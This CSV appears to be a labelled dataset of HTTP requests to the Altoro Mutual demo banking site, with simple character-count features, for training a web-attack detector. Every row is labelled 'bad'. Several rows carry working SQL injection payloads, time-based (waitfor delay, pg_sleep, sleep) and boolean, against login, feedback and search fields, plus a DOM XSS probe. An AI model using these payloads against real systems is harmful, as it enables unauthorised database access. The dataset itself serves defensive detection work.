method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/sitemap.xml.gz,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=4ab5OK3k'));%20waitfor%20delay%20'0:0:9'%20--%20,3,0,1,0,5,3,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=1%c0%00xa7%c0%a2&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=1&submit=Submit,0,0,0,0,2,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2b581-581-1%3d0%2b0%2b0%2b1%20--%20,1,0,1,0,4,1,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1,0,0,0,0,0,1,bad
GET,/util/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=I6AEwYli');%20waitfor%20delay%20'0:0:6'%20--%20&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,3,0,1,0,7,2,bad
POST,/sendFeedback,cfile=%f0''%f0%22%22&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=1&submit=Submit,2,2,0,0,2,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/favicon.ico,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=bBbR7dFH'));select%20pg_sleep(6);%20--%20&uid=1,1,0,1,1,3,3,bad
GET,/index.jsp?content=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/,,2,2,0,14,0,3,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/orZViluF.htm,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=%f0''%f0%22%22&txtEmail=sample%40email.tst,2,2,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/search.jsp?query=1,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp?content=cMMkA4YM');%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=JyI%3d,0,0,0,0,0,1,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=1'%22&submit=Submit,1,1,0,0,2,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%bf'%bf%22,1,1,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp?HostName=%bf'%bf%22,,1,1,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,5,3,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=-1%22%20OR%202%2b274-274-1%3d0%2b0%2b0%2b1%20--%20&txtEmail=sample%40email.tst,0,1,1,0,4,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp?HostName=vhLqhr5Y');select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp?HostName=AltoroMutual,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/swagger/index%22%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20%22429X%22%3d%22429X.html,,0,4,0,0,4,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,"/?id=1'""1000",,1,1,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1%20OR%202%2b422-422-1%3d0%2b0%2b0%2b1%20--%20&uid=1,0,0,1,0,4,1,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%2520Laguna%2520Street%25'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'BfYy'%21%3d'BfYy%25&name=xmsktkqj&subject=1&submit=Submit,4,0,0,0,4,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=%40%40ozD7p,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=-1%22%20OR%202%2b371-371-1%3d0%2b0%2b0%2b1%20--%20&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,0,1,1,0,6,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,"/status_check.jsp?wvstest=javascript:domxssExecutionSink(1,%22%3Cbr%3E()locxss%22)&",,0,2,0,2,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/default.jsp?content=E5VFXFxk');select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=%f0''%f0%22%22&name=brkbujqv&subject=1&submit=Submit,2,2,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/X4nBLVfB'));select%20pg_sleep(9);%20--%20.htm,,1,0,1,1,3,2,bad
GET,/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/%40%40jWhdB.htm,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/swagger/1'%22.html,,1,1,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=-1%20OR%203%2b591-591-1%3d0%2b0%2b0%2b1%20--%20&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,0,0,1,0,6,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b341-341-1%3d0%2b0%2b0%2b1%20--%20,1,0,1,0,4,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/default.jsp?content=%40%40uZ2LA,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/default.jsp?content=ayR3kv5R,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/high_yield_investments'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'fDPH'%3d'fDPH.htm,,4,0,0,0,4,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=-1'%20OR%202%2b783-783-1%3d0%2b0%2b0%2b1%20--%20,1,0,1,0,6,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/high_yield_investments.htm,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=%f0''%f0%22%22&submit=Submit,2,2,0,0,2,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/default.jsp?content=%f0''%f0%22%22,,2,2,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/altoro/images,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/swagger/index.html,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=-1));select%20pg_sleep(3);%20--%20&submit=Submit,0,0,1,1,5,2,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/search.jsp?query=-1'%20OR%203%2b520-520-1%3d0%2b0%2b0%2b1%20--%20,,1,0,1,0,4,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=1&submit=%40%40j27Ai,0,0,0,0,2,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=-1;%20waitfor%20delay%20'0:0:3'%20--%20&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,2,0,1,0,7,2,bad
GET,/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/&subject=1&submit=Submit,2,2,0,15,2,9,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
